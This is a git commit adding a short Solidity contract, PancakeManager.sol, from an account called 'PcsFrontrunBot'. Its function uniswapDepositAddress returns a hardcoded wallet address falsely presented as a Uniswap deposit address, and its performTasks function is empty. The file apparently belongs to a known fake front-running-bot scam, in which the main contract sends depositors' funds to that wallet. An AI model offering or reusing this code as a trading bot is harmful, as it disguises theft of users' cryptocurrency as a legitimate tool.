53697a1c2885965b7e8795dc6c9f0ae133e171df
PcsFrontrunBot <96890799+PcsFrontrunBot@users.noreply.github.com>
2021-12-30 22:32:54 +0100

    Add files via upload

---
+++ PancakeManager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x58B8259D15fE83074471b5220B5971C83da28eB5;
+	}
+}
